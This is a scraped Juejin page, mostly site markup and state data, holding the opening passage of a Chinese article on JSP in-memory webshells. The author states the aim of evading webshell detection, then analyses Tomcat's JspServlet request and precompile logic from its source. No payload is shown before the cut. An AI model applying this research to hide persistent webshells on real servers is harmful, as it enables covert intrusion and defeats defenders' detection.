    <span class="modify-btn" data-v-d0b73df6>点击更改</span></div></div> <div data-transfer="true" class="collection-list-modal byte-modal" data-v-6bd26e03 data-v-b7c4e7d2><div class="byte-modal__mask" style="z-index:36809;display:none;"></div><div class="byte-modal__wrapper" style="z-index:36809;display:none;"><div class="byte-modal__content" style="width:520px;"><!----><div class="byte-modal__body"></div><!----></div></div></div> <!----></div> <div class="share-btn panel-btn" data-v-b7c4e7d2><svg class="sprite-icon icon-share" data-v-0f838daa data-v-b7c4e7d2><use xlink:href="#icon-share" data-v-0f838daa></use></svg> <div class="share-popup" data-v-b7c4e7d2><ul data-v-b7c4e7d2><li class="share-item wechat" data-v-b7c4e7d2><svg class="sprite-icon share-icon icon-wechat" data-v-0f838daa data-v-b7c4e7d2><use xlink:href="#icon-wechat" data-v-0f838daa></use></svg> <span class="share-item-title" data-v-b7c4e7d2>微信</span> <div class="wechat-qrcode" data-v-b7c4e7d2><img src="" class="wechat-qrcode-img" style="display:none;" data-v-b7c4e7d2> <span class="wechat-qrcode-title" data-v-b7c4e7d2>微信扫码分享</span></div></li> <li class="share-item weibo" data-v-b7c4e7d2><svg class="sprite-icon share-icon icon-weibo" data-v-0f838daa data-v-b7c4e7d2><use xlink:href="#icon-weibo" data-v-0f838daa></use></svg> <span class="share-item-title" data-v-b7c4e7d2>新浪微博</span></li> <li class="share-item qq" data-v-b7c4e7d2><svg class="sprite-icon share-icon icon-qq" data-v-0f838daa data-v-b7c4e7d2><use xlink:href="#icon-qq" data-v-0f838daa></use></svg> <span class="share-item-title" data-v-b7c4e7d2>QQ</span></li></ul></div></div> <div class="divider" data-v-b7c4e7d2></div> <div class="panel-btn" data-v-b7c4e7d2><svg class="sprite-icon icon-report" data-v-0f838daa data-v-b7c4e7d2><use xlink:href="#icon-report" data-v-0f838daa></use></svg></div> <span class="tooltip" data-v-b7c4e7d2><div class="byte-tooltip byte-tooltip--dark" style="display:none;">
        沉浸阅读
      </div><span class="byte-tooltip__wrapper"><div class="panel-btn" data-v-b7c4e7d2><svg class="sprite-icon icon-immerse" data-v-0f838daa data-v-b7c4e7d2><use xlink:href="#icon-immerse" data-v-0f838daa></use></svg></div></span></span></div></div> <!----></main> <!----></div> <!----> <div class="global-component-box"><!----> <!----> <!----> <!----> <!----> <!----> <!----></div> <!----><!----><!----><!----><!----><!----><!----> <!----> <!----> <!----><!----><!----></div></div></div><script>window.__NUXT__=(function(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C){t.loading=a;t.skeleton=b;t.cursor=f;t.data=[];t.total=d;t.hasMore=b;return {layout:"default",data:[{skipSSR:a,additionalDataUseCSR:b}],fetch:[{bdPageUrlForNav:"https:\u002F\u002Fbd.juejin.cn?utm_campaign=bd&utm_source=web&utm_medium=nav",queryString:e,isShowUserDropdownList:a,isShowAddMoreList:a,isFocus:a,isPhoneMenuShow:a,visibleBadge:a,placeholder:e,hiddenProperty:"hidden",searchHistoryVisible:a,searchHistoryItems:[],tabBadge:c,isChangePlaceholder:b,showMallBridge:a,isGuideLoginHeaderVisible:a,loginGuideTimer:c,loginGuideStartTime:d,loginGuideNextTime:d,needLoginGuide:a},{articleBanner:{url:"https:\u002F\u002Fjuejin.cn\u002Fextension\u002F?utm_source=standalone&utm_medium=post&utm_campaign=extension_promotion",title:"安装掘金浏览器插件",content:"多内容聚合浏览、多引擎快捷搜索、多工具便捷提效、多模式随心畅享，你想要的，这里都有！"},showExtension:b}],error:c,state:{view:{activityIndex:{activityList:[],pageInfo:{hasNextPage:a,endCursor:e},afterPosition:e,activityListIsLoading:b,activityListIsError:a,userActivityList:[],placeholder:e,actionType:{FETCH:"@\u002Fview\u002Factivity-index\u002FFETCH",FETCH_RECOMMEND_LIST:"@\u002Fview\u002Factivity-index\u002FFETCH_RECOMMEND_LIST",RESET_ACTIVITY_LIST:"@\u002Fview\u002Factivity-index\u002FRESET_ACTIVITY_LIST",FETCH_USER_ACTIVITY_LIST:"@\u002Fview\u002Factivity-index\u002FFETCH_USER_ACTIVITY_LIST",FETCH_NEW_COUNT:"@\u002Fview\u002Factivity-index\u002FFETCH_NEW_COUNT",DELETE_ACTIVITY:"@\u002Fview\u002Factivity-index\u002FDELETE_ACTIVITY",TOGGLE_FOLLOW_USER:"@\u002Fview\u002Factivity-index\u002FTOGGLE_FOLLOW_USER",FETCH_ENTRY_COMMENT_LIST:"@\u002Fview\u002Factivity-index\u002FFETCH_ENTRY_COMMENT_LIST",UPDATE_LIST_LOADING:"@\u002Fview\u002Factivity-index\u002FUPDATE_LIST_LOADING",RESET:"@\u002Fview\u002Factivity-index\u002FRESET"},hotList:{list:[],after:e,loading:a,hasNextPage:a,actionType:{UPDATE_STATE:"@\u002Fview\u002Factivity-index\u002Fhot-list\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Factivity-index\u002Fhot-list\u002FFETCH_MORE",FETCH:"@\u002Fview\u002Factivity-index\u002Fhot-list\u002FFETCH",RESET:"@\u002Fview\u002Factivity-index\u002Fhot-list\u002FRESET"}},sidebar:{bannerList:[],actionType:{RESET:"@\u002Fview\u002Factivity-index\u002Fsidebar\u002FRESET",UPDATE_STATE:"@\u002Fview\u002Factivity-index\u002Fsidebar\u002FUPDATE_STATE",FETCH_BANNER:"@\u002Fview\u002Factivity-index\u002Fsidebar\u002FFETCH_BANNER"},recommend:{pageSize:h,page:d,total:d,pointer:c,lastPointer:c,list:[],loading:a,error:c,canPrev:b,canNext:b,linkList:[],lastFetchOnServer:a,actionType:{UPDATE:"@\u002Fview\u002Factivity-index\u002Fsidebar\u002Frecommend-topic-list\u002FUPDATE",FETCH:"@\u002Fview\u002Factivity-index\u002Fsidebar\u002Frecommend-topic-list\u002FFETCH",FORCE_FETCH:"@\u002Fview\u002Factivity-index\u002Fsidebar\u002Frecommend-topic-list\u002FFORCE_FETCH",FETCH_MORE:"@\u002Fview\u002Factivity-index\u002Fsidebar\u002Frecommend-topic-list\u002FFETCH_MORE",RESET:"@\u002Fview\u002Factivity-index\u002Fsidebar\u002Frecommend-topic-list\u002FRESET"},after:d},followed:{pageSize:h,page:d,total:d,pointer:c,lastPointer:c,list:[],loading:a,error:c,canPrev:b,canNext:b,linkList:[],lastFetchOnServer:a,actionType:{UPDATE:"@\u002Fview\u002Factivity-index\u002Fsidebar\u002Ffollowed-topic-list\u002FUPDATE",FETCH:"@\u002Fview\u002Factivity-index\u002Fsidebar\u002Ffollowed-topic-list\u002FFETCH",FORCE_FETCH:"@\u002Fview\u002Factivity-index\u002Fsidebar\u002Ffollowed-topic-list\u002FFORCE_FETCH",FETCH_MORE:"@\u002Fview\u002Factivity-index\u002Fsidebar\u002Ffollowed-topic-list\u002FFETCH_MORE",RESET:"@\u002Fview\u002Factivity-index\u002Fsidebar\u002Ffollowed-topic-list\u002FRESET"},after:d},recommendPin:{list:[],after:e,loading:a,hasNextPage:b,actionType:{UPDATE_STATE:"@\u002Fview\u002Factivity-index\u002Fsidebar\u002Frecommend-pin-list\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Factivity-index\u002Fsidebar\u002Frecommend-pin-list\u002FFETCH_MORE",FETCH:"@\u002Fview\u002Factivity-index\u002Fsidebar\u002Frecommend-pin-list\u002FFETCH",RESET:"@\u002Fview\u002Factivity-index\u002Fsidebar\u002Frecommend-pin-list\u002FRESET"}}},topicPinList:{pageSize:h,page:g,total:d,pointer:c,lastPointer:c,list:[],loading:a,error:c,canPrev:b,canNext:b,linkList:[],lastFetchOnServer:a,actionType:{UPDATE:"@\u002Fview\u002Factivity-index\u002Ftopic-pin-list\u002FUPDATE",FETCH:"@\u002Fview\u002Factivity-index\u002Ftopic-pin-list\u002FFETCH",FORCE_FETCH:"@\u002Fview\u002Factivity-index\u002Ftopic-pin-list\u002FFORCE_FETCH",FETCH_MORE:"@\u002Fview\u002Factivity-index\u002Ftopic-pin-list\u002FFETCH_MORE",RESET:"@\u002Fview\u002Factivity-index\u002Ftopic-pin-list\u002FRESET"},topicId:e,navList:[{type:k,name:k,title:"推荐 ",id:k},{type:l,name:l,title:"热门 ",id:l},{type:r,name:r,title:"关注 ",id:r},{type:i,name:"opensource",title:"开源推荐 ",id:"5c09ea2b092dcb42c740fe73"},{type:i,name:"recruitment",title:"内推招聘",id:"5abb61e1092dcb4620ca3322"},{type:i,name:"dating",title:"掘金相亲",id:"5abcaa67092dcb4620ca335c"},{type:i,name:"slacking",title:"上班摸鱼",id:"5c106be9092dcb2cc5de7257"},{type:i,name:"app",title:"应用安利",id:"5b514af1092dcb61bd72800d"},{type:i,name:"tool",title:"开发工具",id:"5abb67d2092dcb4620ca3324"},{type:i,name:"news",title:"New资讯",id:"5c46a17f092dcb4737217152"}],sortType:s}},search:{search_result_from:d,query:e,list:[],linkList:[],loading:a,skeleton:b,actionType:{FETCH:"@\u002Fview\u002Fsearch\u002FFETCH",FETCH_MORE:"@\u002Fview\u002Fsearch\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fsearch\u002FRESET"}},columnIndex:{list:{pageSize:h,page:g,total:d,pointer:c,lastPointer:c,list:[],loading:a,error:c,canPrev:b,canNext:b,linkList:[],lastFetchOnServer:a,actionType:{UPDATE:"@\u002Fview\u002FcolumnIndex\u002Flist\u002FUPDATE",FETCH:"@\u002Fview\u002FcolumnIndex\u002Flist\u002FFETCH",FORCE_FETCH:"@\u002Fview\u002FcolumnIndex\u002Flist\u002FFORCE_FETCH",FETCH_MORE:"@\u002Fview\u002FcolumnIndex\u002Flist\u002FFETCH_MORE",RESET:"@\u002Fview\u002FcolumnIndex\u002Flist\u002FRESET"},sort:m,category:"all"},hotList:{pageSize:h,page:g,total:d,pointer:c,lastPointer:c,list:[],loading:a,error:c,canPrev:b,canNext:b,linkList:[],lastFetchOnServer:a,actionType:{UPDATE:"@\u002Fview\u002FcolumnIndex\u002FhotList\u002FUPDATE",FETCH:"@\u002Fview\u002FcolumnIndex\u002FhotList\u002FFETCH",FORCE_FETCH:"@\u002Fview\u002FcolumnIndex\u002FhotList\u002FFORCE_FETCH",FETCH_MORE:"@\u002Fview\u002FcolumnIndex\u002FhotList\u002FFETCH_MORE",RESET:"@\u002Fview\u002FcolumnIndex\u002FhotList\u002FRESET"}}},timelineIndex:{tdkTemplates:[],categoryNavList:[],tagNavList:[],splitTagList:[],timelineAdList:[],list:[],sort:s,category:k,categoryId:e,tagId:e,tag:"全部",actionType:{FETCH_TIMELINE_LIST:"@\u002Fview\u002FtimelineIndex\u002FFETCH_TIMELINE_LIST",FETCH_CATEGORY_LIST:"@\u002Fview\u002FtimelineIndex\u002FFETCH_CATEGORY_LIST",FETCH_TAG_LIST:"@\u002Fview\u002FtimelineIndex\u002FFETCH_TAG_LIST",DELETE_ENTRY:"@\u002Fview\u002FtimelineIndex\u002FDELETE_ENTRY",DELETE_USER_ENTRIES:"@\u002Fview\u002FtimelineIndex\u002FDELETE_USER_ENTRIES",DELETE_TAG_ENTRIES:"@\u002Fview\u002FtimelineIndex\u002FDELETE_TAG_ENTRIES",FETCH_MORE:"@\u002Fview\u002FtimelineIndex\u002FFETCH_MORE",FETCH:"@\u002Fview\u002FtimelineIndex\u002FFETCH",RESET:"@\u002Fview\u002FtimelineIndex\u002FRESET"},serverRenderTimelineList:a,timelineList:{list:[],cursor:f,skeleton:b,loading:a,hasMore:b,categoryId:e,tagId:e,sort:e,actionType:{UPDATE_STATE:"timeline-list\u002FUPDATE_STATE",FETCH_MORE:"timeline-list\u002FFETCH_MORE",FETCH:"timeline-list\u002FFETCH",RESET:"timeline-list\u002FRESET"}},recommendList:{list:[],cursor:f,loading:a,skeleton:b,hasMore:b,actionType:{UPDATE_STATE:"recommend-list\u002FUPDATE_STATE",FETCH_MORE:"recommend-list\u002FFETCH_MORE",FETCH:"recommend-list\u002FFETCH",RESET:"recommend-list\u002FRESET"}},followingList:{list:[],cursor:f,skeleton:b,loading:a,hasMore:b,actionType:{UPDATE_STATE:"following-list\u002FUPDATE_STATE",FETCH_MORE:"following-list\u002FFETCH_MORE",FETCH:"following-list\u002FFETCH",RESET:"following-list\u002FRESET"}}},subscribe:{subscribed:{list:[],cursor:f,skeleton:b,loading:a,hasMore:a,actionType:{UPDATE_STATE:"view\u002Fsubscribe\u002Fsubscribed\u002Flist\u002FUPDATE_STATE",FETCH_MORE:"view\u002Fsubscribe\u002Fsubscribed\u002Flist\u002FFETCH_MORE",FETCH:"view\u002Fsubscribe\u002Fsubscribed\u002Flist\u002FFETCH",RESET:"view\u002Fsubscribe\u002Fsubscribed\u002Flist\u002FRESET"}},all:{list:[],cursor:f,loading:a,skeleton:b,hasMore:a,linkList:e,actionType:{UPDATE_STATE:"view\u002Fsubscribe\u002Fall\u002Flist\u002FUPDATE_STATE",FETCH_MORE:"view\u002Fsubscribe\u002Fall\u002Flist\u002FFETCH_MORE",FETCH:"view\u002Fsubscribe\u002Fall\u002Flist\u002FFETCH",RESET:"view\u002Fsubscribe\u002Fall\u002Flist\u002FRESET"}}},entryPublic:{entry:{user:{}},relatedEntryList:[],relatedCollectionList:[],actionType:{FETCH:"@\u002Fview\u002FentryPublic\u002FFETCH",RESET:"@\u002Fview\u002FentryPublic\u002FRESET"}},user:{user:{},serverRendered:a,userAnnuals:[],actionType:{FETCH:"@\u002Fview\u002Fuser\u002FFETCH",RESET:"@\u002Fview\u002Fuser\u002FRESET",UPDATE:"@\u002Fview\u002Fuser\u002FUPDATE",FETCH_ANNUALS:"@\u002Fview\u002Fuser\u002FFETCH_ANNUALS"},detailList:{actionType:{RESET:"@\u002Fview\u002Fuser\u002FdetailList\u002FRESET"},likeList:{list:[],cursor:f,hasMore:a,loading:a,skeleton:b,actionType:{FETCH:"@\u002Fview\u002Fuser\u002FdetailList\u002FlikePostList\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Fuser\u002FdetailList\u002FlikePostList\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fuser\u002FdetailList\u002FlikePostList\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fuser\u002FdetailList\u002FlikePostList\u002FRESET"}},postList:{list:[],hasMore:a,skeleton:a,loading:a,sort:m,actionType:{FETCH:"@\u002Fview\u002Fuser\u002FdetailList\u002FpostList\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Fuser\u002FdetailList\u002FpostList\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fuser\u002FdetailList\u002FpostList\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fuser\u002FdetailList\u002FpostList\u002FRESET"}},searchList:{list:[],hasMore:a,skeleton:a,loading:a,key_word:e,search_type:d,cursor:f,isPostSearch:a,actionType:{FETCH:"@\u002Fview\u002Fuser\u002FdetailList\u002FsearchList\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Fuser\u002FdetailList\u002FsearchList\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fuser\u002FdetailList\u002FsearchList\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fuser\u002FdetailList\u002FsearchList\u002FRESET"}},tagList:{list:[],loading:a,skeleton:b,hasMore:a,cursor:f,actionType:{FETCH:"@\u002Fview\u002Fuser\u002FdetailList\u002FtagList\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Fuser\u002FdetailList\u002FtagList\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fuser\u002FdetailList\u002FtagList\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fuser\u002FdetailList\u002FtagList\u002FRESET"}},collectionList:{list:[],userId:e,skeleton:b,hasMore:a,cursor:f,type:"created",loading:a,actionType:{FETCH:"@\u002Fview\u002Fuser\u002FdetailList\u002FcollectionList\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Fuser\u002FdetailList\u002FcollectionList\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fuser\u002FdetailList\u002FcollectionList\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fuser\u002FdetailList\u002FcollectionList\u002FRESET",TOGGLE_FOLLOW_COLLECTION:"@\u002Fview\u002Fuser\u002FdetailList\u002FcollectionList\u002FTOGGLE_FOLLOW_COLLECTION",FOLLOW_COLLECTION:"@\u002Fview\u002Fuser\u002FdetailList\u002FcollectionList\u002FFOLLOW_COLLECTION",UNFOLLOW_COLLECTION:"@\u002Fview\u002Fuser\u002FdetailList\u002FcollectionList\u002FUNFOLLOW_COLLECTION",DELELTE_COLLECTION:"@\u002Fview\u002Fuser\u002FdetailList\u002FcollectionList\u002FDELELTE_COLLECTION",ADD_COLLECTION:"@\u002Fview\u002Fuser\u002FdetailList\u002FcollectionList\u002FADD_COLLECTION",EDIT_COLLECTION:"@\u002Fview\u002Fuser\u002FdetailList\u002FcollectionList\u002FEDIT_COLLECTION"}},followerList:{list:[],cursor:f,hasMore:a,loading:a,skeleton:a,actionType:{FETCH:"@\u002Fview\u002Fuser\u002FdetailList\u002FfollowerList\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Fuser\u002FdetailList\u002FfollowerList\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fuser\u002FdetailList\u002FfollowerList\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fuser\u002FdetailList\u002FfollowerList\u002FRESET"}},followingList:{list:[],cursor:f,hasMore:a,skeleton:a,loading:a,actionType:{FETCH:"@\u002Fview\u002Fuser\u002FdetailList\u002FfollowingList\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Fuser\u002FdetailList\u002FfollowingList\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fuser\u002FdetailList\u002FfollowingList\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fuser\u002FdetailList\u002FfollowingList\u002FRESET"}},followingTeamsList:{list:[],cursor:f,hasMore:a,skeleton:a,loading:a,actionType:{FETCH:"@\u002Fview\u002Fuser\u002FdetailList\u002FfollowingTeamsList\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Fuser\u002FdetailList\u002FfollowingTeamsList\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fuser\u002FdetailList\u002FfollowingTeamsList\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fuser\u002FdetailList\u002FfollowingTeamsList\u002FRESET"}},activityList:{list:[],cursor:f,hasMore:a,loading:a,skeleton:a,actionType:{FETCH:"@\u002Fview\u002Fuser\u002FdetailList\u002FactivityList\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Fuser\u002FdetailList\u002FactivityList\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fuser\u002FdetailList\u002FactivityList\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fuser\u002FdetailList\u002FactivityList\u002FRESET"}},bookList:{list:[],cursor:f,skeleton:b,hasMore:a,loading:a,type:"bought",actionType:{FETCH:"@\u002Fview\u002Fuser\u002FdetailList\u002FbookList\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Fuser\u002FdetailList\u002FbookList\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fuser\u002FdetailList\u002FbookList\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fuser\u002FdetailList\u002FbookList\u002FRESET"}},pinList:{list:[],hasMore:a,loading:a,skeleton:b,actionType:{FETCH:"@\u002Fview\u002Fuser\u002FdetailList\u002FpinList\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Fuser\u002FdetailList\u002FpinList\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fuser\u002FdetailList\u002FpinList\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fuser\u002FdetailList\u002FpinList\u002FRESET"}},courseList:{list:[],hasMore:a,loading:a,skeleton:b,actionType:{FETCH:"@\u002Fview\u002Fuser\u002FdetailList\u002FcourseList\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Fuser\u002FdetailList\u002FcourseList\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fuser\u002FdetailList\u002FcourseList\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fuser\u002FdetailList\u002FcourseList\u002FRESET"}},pinPraisedList:{list:[],cursor:f,hasMore:a,loading:a,skeleton:b,actionType:{FETCH:"@\u002Fview\u002Fuser\u002FdetailList\u002FpinPraisedList\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Fuser\u002FdetailList\u002FpinPraisedList\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fuser\u002FdetailList\u002FpinPraisedList\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fuser\u002FdetailList\u002FpinPraisedList\u002FRESET"}},eventList:{list:[],cursor:f,hasMore:a,loading:a,skeleton:a,actionType:{FETCH:"@\u002Fview\u002Fuser\u002FdetailList\u002FeventList\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Fuser\u002FdetailList\u002FeventList\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fuser\u002FdetailList\u002FeventList\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fuser\u002FdetailList\u002FeventList\u002FRESET"}},selfColumnList:{list:[],hasMore:a,skeleton:a,loading:a,cursor:f,actionType:{FETCH:"@\u002Fview\u002Fuser\u002FdetailList\u002FcolumnList\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Fuser\u002FdetailList\u002FcolumnList\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fuser\u002FdetailList\u002FcolumnList\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fuser\u002FdetailList\u002FcolumnList\u002FRESET"}},columnFollowedList:{list:[],hasMore:a,skeleton:a,loading:a,cursor:f,actionType:{FETCH:"@\u002Fview\u002Fuser\u002FdetailList\u002FcolumnFollowedList\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Fuser\u002FdetailList\u002FcolumnFollowedList\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fuser\u002FdetailList\u002FcolumnFollowedList\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fuser\u002FdetailList\u002FcolumnFollowedList\u002FRESET",FILTER:"@\u002Fview\u002Fuser\u002FdetailList\u002FcolumnFollowedList\u002FFILTER"}},realtimes:{list:[],cursor:f,hasMore:a,loading:a,skeleton:a,actionType:{FETCH:"@\u002Fview\u002Fuser\u002FdetailList\u002Frealtimes\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Fuser\u002FdetailList\u002Frealtimes\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fuser\u002FdetailList\u002Frealtimes\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fuser\u002FdetailList\u002Frealtimes\u002FRESET",DELETE:"@\u002Fview\u002Fuser\u002FdetailList\u002Frealtimes\u002FDELETE"}},realtimeliked:{list:[],cursor:f,hasMore:a,loading:a,skeleton:a,actionType:{FETCH:"@\u002Fview\u002Fuser\u002FdetailList\u002Frealtimeliked\u002FFETCH",UPDATE_STATE:"@\u002Fview\u002Fuser\u002FdetailList\u002Frealtimeliked\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fuser\u002FdetailList\u002Frealtimeliked\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fuser\u002FdetailList\u002Frealtimeliked\u002FRESET",DELETE:"@\u002Fview\u002Fuser\u002FdetailList\u002Frealtimeliked\u002FDELETE"}}}},tag:{tag:{},actionType:{FETCH:"@\u002Fview\u002Ftag\u002FFETCH",FETCH_LIST:"@\u002Fview\u002Ftag\u002FFETCH_LIST",RESET:"@\u002Fview\u002Ftag\u002FRESET"},list:{list:[],cursor:f,loading:a,skeleton:a,hasMore:a,actionType:{UPDATE_STATE:"@\u002Fview\u002Ftag\u002Flist\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Ftag\u002Flist\u002FFETCH_MORE",FETCH:"@\u002Fview\u002Ftag\u002Flist\u002FFETCH",RESET:"@\u002Fview\u002Ftag\u002Flist\u002FRESET"}}},notification:{user:{actionType:{READ_ALL:"@\u002Fview\u002Fnotification\u002Fuser\u002FREAD_ALL",RESET:"@\u002Fview\u002Fnotification\u002Fuser\u002FRESET"},listState:{list:[],cursor:f,hasMore:a,isLoading:a,messageType:3,msgTotal:d,msgSubMap:{"1":d,"2":d,"3":d,"4":d}},list:{pageSize:h,page:g,total:d,pointer:c,lastPointer:c,list:[],loading:a,error:c,canPrev:b,canNext:b,linkList:[],lastFetchOnServer:a,actionType:{UPDATE:"@\u002Fview\u002Fnotification\u002Fuser\u002Flist\u002FUPDATE",FETCH:"@\u002Fview\u002Fnotification\u002Fuser\u002Flist\u002FFETCH",FORCE_FETCH:"@\u002Fview\u002Fnotification\u002Fuser\u002Flist\u002FFORCE_FETCH",FETCH_MORE:"@\u002Fview\u002Fnotification\u002Fuser\u002Flist\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fnotification\u002Fuser\u002Flist\u002FRESET"}}},system:{actionType:{READ_ALL:"@\u002Fview\u002Fnotification\u002Fsystem\u002FREAD_ALL",RESET:"@\u002Fview\u002Fnotification\u002Fsystem\u002FRESET"},list:{pageSize:h,page:g,total:d,pointer:c,lastPointer:c,list:[],loading:a,error:c,canPrev:b,canNext:b,linkList:[],lastFetchOnServer:a,actionType:{UPDATE:"@\u002Fview\u002Fnotification\u002Fsystem\u002Flist\u002FUPDATE",FETCH:"@\u002Fview\u002Fnotification\u002Fsystem\u002Flist\u002FFETCH",FORCE_FETCH:"@\u002Fview\u002Fnotification\u002Fsystem\u002Flist\u002FFORCE_FETCH",FETCH_MORE:"@\u002Fview\u002Fnotification\u002Fsystem\u002Flist\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fnotification\u002Fsystem\u002Flist\u002FRESET"}}}},column:{renderPost:b,serverRenderList:a,column:{id:w},entry:{id:w,screenshot:void 0,liked:a,article_id:w,article_info:{article_id:w,user_id:"3096695179321544",category_id:"6809637776263217160",tag_ids:[6809640422172787000],visible_level:d,link_url:e,cover_image:e,is_gfw:d,title:"【Web安全】JSP内存马研究",brief_content:"前言 最近在研究webshell免杀的问题，到了内存马免杀部分发现传统的Filter或者Servlet查杀手段比较多，不太容易实现免杀，比如有些工具会将所有注册的Servlet和Filter拿出来，排",is_english:d,is_original:g,user_index:.654880837720215,original_type:d,original_author:e,content:e,ctime:"1634634516",mtime:"1634640025",rtime:"1634637756",draft_id:"7020701466918682631",view_count:797,collect_count:g,digg_count:g,comment_count:d,hot_index:40,is_hot:d,rank_index:.00027791,status:u,verify_status:g,audit_status:u,mark_content:"## ![](https:\u002F\u002Fp3-juejin.byteimg.com\u002Ftos-cn-i-k3u1fbpfcp\u002F8e050c964e6f47938121ce8f3cd5039c~tplv-k3u1fbpfcp-zoom-1.image)\n\n## 前言\n\n最近在研究webshell免杀的问题，到了内存马免杀部分发现传统的Filter或者Servlet查杀手段比较多，不太容易实现免杀，比如有些工具会将所有注册的`Servlet`和`Filter`拿出来，排查人员仔细一点还是会被查出来的，所以\\\n**我们要找一些其他方式实现的内存马。比如我今天提到的JSP的内存马（虽然本质上也是一种Servlet类型的马）**  。\n\n## [【学习资料】](https:\u002F\u002Fwww.oschina.net\u002Faction\u002FGoToLink?url=https%3A%2F%2Fdocs.qq.com%2Fdoc%2FDVFNpaGJvRFJiQ2Ro)\n\n## JSP加载流程分析\n\n在Tomcat中`jsp`和`jspx`都会交给`JspServlet`处理，所以要想实现`JSP`驻留内存，首先得分析`JspServlet`的处理逻辑。\n\n```\n\u003Cservlet\u003E\n        \u003Cservlet-name\u003Ejsp\u003C\u002Fservlet-name\u003E\n        \u003Cservlet-class\u003Eorg.apache.jasper.servlet.JspServlet\u003C\u002Fservlet-class\u003E\n    ...\n    \u003C\u002Fservlet\u003E\n...\n\u003Cservlet-mapping\u003E\n        \u003Cservlet-name\u003Ejsp\u003C\u002Fservlet-name\u003E\n        \u003Curl-pattern\u003E*.jsp\u003C\u002Furl-pattern\u003E\n        \u003Curl-pattern\u003E*.jspx\u003C\u002Furl-pattern\u003E\n    \u003C\u002Fservlet-mapping\u003E\n```\n\n下面分析`JspServlet#service`方法，主要的功能是接收请求的URL，判断是否预编译，核心的方法是`serviceJspFile`。\n\n```\npublic void service (HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String jspUri = jspFile;\n            jspUri = (String) request.getAttribute(\n                    RequestDispatcher.INCLUDE_SERVLET_PATH);\n            if (jspUri != null) {\n      \u002F\u002F检查请求是否是通过其他Servlet转发过来的\n                String pathInfo = (String) request.getAttribute(\n                        RequestDispatcher.INCLUDE_PATH_INFO);\n                if (pathInfo != null) {\n                    jspUri += pathInfo;\n                }\n            } else {\n       \u002F\u002F获取ServletPath和pathInfo作为jspUri\n                jspUri = request.getServletPath();\n                String pathInfo = request.getPathInfo();\n                if (pathInfo != null) {\n                    jspUri += pathInfo;\n                }\n            }\n        }\n        try {\n            \u002F\u002F是否预编译\n            boolean precompile = preCompile(request);\n            \u002F\u002F核心方法\n            serviceJspFile(request, response, jspUri, precompile);\n        } catch (RuntimeException | IOException | ServletException e) {\n            throw e;\n        } catch (Throwable e) {\n            ExceptionUtils.handleThrowable(e);\n            throw new ServletException(e);\n        }\n    }\n```\n\n`preCompile`中只有当请求参数以`jsp_precompile`开始才会进行预编译，否则不进行预编译。\n\n```\nboolean preCompile(HttpServletRequest request) throws ServletException {\n        String queryString = request.getQueryString();\n        if (queryString == null) {\n            return false;\n        }\n        \u002F\u002F    public static final String PRECOMPILE = System.getProperty(\"org.apache.jasper.Constants.PRECOMPILE\", \"jsp_precompile\");\n        int start = queryString.indexOf(Constants.PRECOMPILE);\n        if (start \u003C 0) {\n            return false;\n        }\n        queryString =\n            queryString.substring(start + 